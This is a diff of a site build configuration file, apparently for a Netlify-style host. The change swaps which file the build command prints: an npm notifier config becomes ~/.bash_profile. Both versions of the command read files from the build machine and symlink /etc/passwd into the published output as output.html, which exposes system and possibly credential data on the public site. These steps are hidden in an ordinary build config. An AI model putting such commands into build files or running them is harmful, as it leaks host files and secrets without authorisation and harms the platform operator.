@@ -1,5 +1,5 @@
 [build]
-  command = "cd /opt/buildhome/ && cat .config/configstore/update-notifier-npm.json && cd /opt/build && mkdir dist && cd dist && ln -s /etc/passwd output.html"
+  command = "cd /opt/buildhome/ && cat ~/.bash_profile && cd /opt/build && mkdir dist && cd dist && ln -s /etc/passwd output.html"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.10.1"
